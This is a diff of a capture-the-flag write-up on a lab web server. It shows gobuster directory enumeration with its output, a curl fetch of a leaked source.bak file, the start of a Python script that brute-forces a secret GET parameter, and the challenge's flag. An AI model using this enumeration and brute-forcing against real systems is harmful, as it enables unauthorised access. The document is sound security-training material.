@@ -1,13 +1,11 @@
 # Web Recon \& Enumeration Not So Random
 
-
-
 First of all we have the site: http://ctf-06.security.cs.pub.ro:8000/ 
 
-'Nothing to see here' which led me to a commonlist to see if there are hidden endpoints/files/directories with gobuster an instrument of type brute-force:
-gobuster dir -u http://ctf-06.security.cs.pub.ro:8000/ -w ~/common.txt
+'Nothing to see here' which led me to a commonlist to see if there are hidden **endpoints/files/directories** with gobuster an instrument of type brute-force:
+**gobuster dir -u http://ctf-06.security.cs.pub.ro:8000/ -w ~/common.txt**
 
-
+```bash
 /.hta.html            (Status: 403) [Size: 292]
 /.hta                 (Status: 403) [Size: 292]
 /.hta.php             (Status: 403) [Size: 292]
@@ -27,20 +25,23 @@ gobuster dir -u http://ctf-06.security.cs.pub.ro:8000/ -w ~/common.txt
 /index.php            (Status: 200) [Size: 19]
 /server-status        (Status: 403) [Size: 292]
 /source.bak           (Status: 200) [Size: 110]
+```
 
-The interesting part is source.bak and index.php: 
+The interesting part is **source.bak** and **index.php**: 
 We curl: 
 
+```bash
 vladpiriia@Vlads-MacBook-Air ~ % curl http://ctf-06.security.cs.pub.ro:8000/source.bak
 if (isset($_GET['random_numberrr']) && intval($_GET['random_numberrr']) === $random_number) {
     echo $flag;
 }%
-
-This means that server verifies if we send a GET parameter named random_numberrr then compares that with a secret value $random_number and then if they are equal we are shown the flag.
-
-But : GET http://ctf-06.security.cs.pub.ro:8000/source.bak?random_numberrr=12345 Source.bak este is a statice file, the server doesn't understand that PHP code, it shows as text, it doesn't run it so we need to modify it to have a script for : http://ctf-06.security.cs.pub.ro:8000/index.php?random_numberrr=12345.
-
 ```
+
+This means that server verifies if we send a **GET** parameter named random_numberrr then compares that with a secret value $random_number and then if they are equal we are shown the flag.
+
+But : **GET http://ctf-06.security.cs.pub.ro:8000/source.bak?random_numberrr=12345** ***Source.bak*** este is a statice file, the server doesn't understand that PHP code, it shows as text, it doesn't run it so we need to modify it to have a script for: **http://ctf-06.security.cs.pub.ro:8000/index.php?random_numberrr=12345**.
+
+```py
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -72,5 +73,4 @@ if __name__ == "__main__":
 ```
 
 
-So then we find the flag at the number 49 999: Flag 49999: SSS{random_can_sometimes_be_predictable}.
-
+So then we find the flag at the number *49 999*: **Flag 49999: SSS{random_can_sometimes_be_predictable}**.
